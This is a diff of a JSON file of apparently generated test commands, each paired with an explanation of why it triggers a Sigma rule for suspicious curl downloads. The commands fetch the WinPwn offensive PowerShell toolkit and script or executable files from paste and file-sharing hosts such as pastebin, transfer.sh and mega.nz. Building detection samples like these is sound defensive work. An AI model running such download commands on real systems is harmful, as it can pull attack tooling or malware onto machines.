@@ -1,14 +1,22 @@
 [
   {
-    "output": "curl --output \"https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\"",
-    "explanation": "The command uses --output instead of -O, which is an equivalent flag per the Sigma rule's detection criteria. The URL remains unchanged and matches the GitHub domain, ensuring it still triggers the rule."
+    "output": "curl.exe -O https://pastebin.com/raw/abcd1234.ps1",
+    "explanation": "This command uses curl.exe with the -O flag to download a file from a domain (pastebin.com) listed in the Sigma rule and ends with a .ps1 extension, matching all conditions in the rule."
   },
   {
-    "output": "curl -O https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1",
-    "explanation": "The command uses -O as specified in the Sigma rule, and the URL remains unchanged. This is the original true positive command and will trigger the rule."
+    "output": "curl.exe --remote-name https://cdn.discordapp.com/attachments/123456789012345678/987654321098765432/file.bat",
+    "explanation": "This command uses curl.exe with the --remote-name flag to download a file from a domain (cdn.discordapp.com) listed in the Sigma rule and ends with a .bat extension, matching all conditions in the rule."
   },
   {
-    "output": "curl --output https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1",
-    "explanation": "The command uses --output instead of -O, which is an equivalent flag per the Sigma rule's detection criteria. The URL remains unchanged and matches the GitHub domain, ensuring it still triggers the rule."
+    "output": "curl.exe -o file.exe https://transfer.sh/abcd1234.exe",
+    "explanation": "This command uses curl.exe with the -o flag to download a file from a domain (transfer.sh) listed in the Sigma rule and ends with an .exe extension, matching all conditions in the rule."
+  },
+  {
+    "output": "curl.exe --output file.dat https://mega.nz/1234567890/file.dat",
+    "explanation": "This command uses curl.exe with the --output flag to download a file from a domain (mega.nz) listed in the Sigma rule and ends with a .dat extension, matching all conditions in the rule."
+  },
+  {
+    "output": "curl.exe -O https://gofile.io/d/abcd1234.ps1",
+    "explanation": "This command uses curl.exe with the -O flag to download a file from a domain (gofile.io) listed in the Sigma rule and ends with a .ps1 extension, matching all conditions in the rule."
   }
 ]
